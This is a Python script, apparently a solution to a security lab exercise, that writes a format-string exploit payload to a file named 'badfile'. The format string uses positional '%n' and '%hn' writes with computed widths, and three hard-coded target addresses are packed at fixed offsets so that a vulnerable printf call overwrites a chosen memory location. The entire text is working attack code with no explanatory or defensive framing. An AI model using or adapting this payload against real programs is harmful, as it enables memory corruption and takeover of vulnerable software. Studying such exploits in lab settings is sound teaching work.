#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x90 for i in range(N))
padding = 512
p2 = padding + 8
p3 = padding + 16
# This line shows how to store a 4-byte integer at offset 0

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
D1 = 0x7fff
D2 = 0xffff - 0x7fff
D3 = 0xe1e9
#Frame Pointer (inside myprintf):      0x00007fffffffe1e0

#s = "%.lx."*96 + "%." + str(D1)+ "x"+ "%n"  
s =  "%." + str(D1)+ "x"+ "%98$n"  + "%." + str(D2)+ "x"+ "%99$hn" + "%." + str(D3)+ "x"+ "%100$hn" 

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')

content[0:len(fmt)] = fmt
address = 0x555555558010
number  = address + 4
number2  = address + 2
number3  = address
content[padding:8 +padding]  =  (number).to_bytes(8,byteorder='little')
content[p2:8 +p2]  =  (number2).to_bytes(8,byteorder='little')
content[p3:8 +p3]  =  (number3).to_bytes(8,byteorder='little')


# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
